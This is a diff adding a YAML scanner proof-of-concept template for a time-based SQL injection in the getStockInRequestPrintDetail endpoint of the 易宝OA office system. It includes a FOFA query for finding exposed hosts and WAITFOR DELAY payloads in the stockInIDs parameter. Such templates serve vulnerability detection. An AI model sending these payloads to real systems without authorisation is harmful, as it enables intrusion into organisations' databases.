@@ -1,0 +1,25 @@
+id: poc-yaml-yi-bao-oa-system-getstockinrequestprintdetail-sqli
+info:
+  name: 易宝OA系统 getStockInRequestPrintDetail SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易宝OA
+  fofa: app="顶讯科技-易宝OA系统"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,`"message":`) && contains(body,`"is_succeed":`)
+    && contains(body,`"data":null`) && contains(content_type,"application/json") &&
+    duration > t1 && duration < t2
+- method: GET
+  path: /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:{{.t3}}%27--
+  expression: status_code == 200 && contains(body,`"message":`) && contains(body,`"is_succeed":`)
+    && contains(body,`"data":null`) && contains(content_type,"application/json") &&
+    duration > t3 && duration < t4
+transport: http
